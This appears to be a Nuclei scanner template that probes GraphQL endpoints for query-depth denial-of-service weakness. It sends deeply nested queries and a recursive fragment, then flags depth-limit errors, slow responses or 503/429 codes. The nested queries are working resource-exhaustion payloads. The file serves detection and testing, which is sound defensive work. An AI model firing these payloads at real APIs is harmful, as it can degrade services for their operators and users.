id: graphql-depth-bomb
info:
  author: geeknik
  classification:
    cwe-id: CWE-400
  description: 'Detects GraphQL endpoints vulnerable to query depth attacks that can
    cause

    denial of service through excessive nested queries and resource exhaustion.

    '
  metadata:
    max-request: 4
  name: GraphQL Query Depth Attack Detection
  reference:
  - https://www.apollographql.com/blog/graphql/security/securing-your-graphql-api-from-malicious-queries/
  - https://portswigger.net/web-security/graphql
  severity: high
  tags: graphql,dos,api,depth-attack
requests:
- body: "{\n  \"query\": \"query DepthTest{{depth_id}} { __typename }\"\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/graphql'
  - '{{BaseURL}}/api/graphql'
  - '{{BaseURL}}/v1/graphql'
  - '{{BaseURL}}/query'
- body: "{\n  \"query\": \"query { user { posts { comments { author { posts { comments\
    \ { author { posts { comments { author { posts { comments { text } } } } } } }\
    \ } } } } } }\"\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/graphql'
  - '{{BaseURL}}/api/graphql'
  - '{{BaseURL}}/v1/graphql'
  - '{{BaseURL}}/query'
- body: "{\n  \"query\": \"query { node(id: 1) { ... on User { friends { friends {\
    \ friends { friends { friends { friends { friends { friends { friends { friends\
    \ { name } } } } } } } } } } } }\"\n}\n"
  headers:
    Content-Type: application/json
  method: POST
  path:
  - '{{BaseURL}}/graphql'
  - '{{BaseURL}}/api/graphql'
  - '{{BaseURL}}/v1/graphql'
  - '{{BaseURL}}/query'
- body: "{\n  \"query\": \"fragment Recursive on User { name posts { comments { author\
    \ { ...Recursive } } } } query { user { ...Recursive } }\"\n}\n"
  extractors:
  - part: body
    regex:
    - depth["\s:]+(\d+)
    - complexity["\s:]+(\d+)
    - cost["\s:]+(\d+)
    type: regex
  headers:
    Content-Type: application/json
  matchers:
  - part: body
    type: word
    words:
    - Query depth limit exceeded
    - max query depth
    - query is too complex
    - Query complexity
    - depth limit
    - Maximum query depth
  - condition: and
    dsl:
    - duration >= 5
    - status_code == 200
    type: dsl
  - status:
    - 503
    - 429
    type: status
  matchers-condition: or
  method: POST
  path:
  - '{{BaseURL}}/graphql'
  - '{{BaseURL}}/api/graphql'
  - '{{BaseURL}}/v1/graphql'
  - '{{BaseURL}}/query'
  stop-at-first-match: true
variables:
  depth_id: '{{randstr}}'
